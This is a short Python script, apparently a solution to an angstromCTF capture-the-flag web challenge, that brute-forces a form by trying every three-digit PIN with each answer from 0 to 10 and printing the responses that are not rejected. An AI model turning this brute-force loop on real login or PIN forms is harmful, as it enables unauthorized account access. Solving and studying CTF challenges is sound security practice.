import requests
payload = {'question1':'6', 'pin':'000'}
q1 = ['0','1','2','3','4','5','6','7','8','9','10']
pins = []
for i in range(10):
    for j in range(10):
        for k in range(10):
            pins.append(str(i) + str(j) + str(k))
for i in pins:
    for j in q1:
        payload['question1'] = j
        payload['pin'] = i
        r = requests.post('http://web.angstromctf.com:1342', payload)
        if not "Bad" in r.text:
            if not "Wrong" in r.text:
                print(r.text)
            print(i)
